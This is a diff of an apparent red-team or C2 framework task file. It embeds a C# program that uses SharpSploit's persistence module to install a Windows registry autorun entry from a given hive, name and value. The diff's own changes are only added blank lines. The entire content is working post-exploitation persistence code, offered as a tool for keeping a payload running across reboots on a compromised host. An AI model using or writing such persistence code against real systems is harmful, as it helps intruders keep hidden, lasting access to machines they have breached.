@@ -39,6 +39,7 @@ csharp:
     using System;
     using System.IO;
     using SharpSploit.Persistence;
+
     public static class Program
     {
         public static void Main(string[] args)
@@ -46,9 +47,11 @@ csharp:
             string targetHive = args.Length > 0 ? args[0] : "";
             string name = args.Length > 1 ? args[1] : "";
             string value = args.Length > 2 ? args[2] : "";
+
             string result = InstallAutorunPersistence(targetHive, name, value);
             Console.WriteLine(result);
         }
+
         public static string InstallAutorunPersistence(string targetHive, string name, string value = "")
         {
             using (StringWriter stringWriter = new StringWriter())
@@ -61,6 +64,7 @@ csharp:
                     {
                         return "Autorun Persistence failed. Invalid Target Hive specified.";
                     }
+
                     if (Autorun.InstallAutorun(targetHive, value, name))
                     {
                         stringWriter.WriteLine("Startup Persistence succeeded for: " + name);
@@ -74,6 +78,7 @@ csharp:
                 {
                     stringWriter.WriteLine(e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace);
                 }
+
                 return stringWriter.ToString();
             }
         }
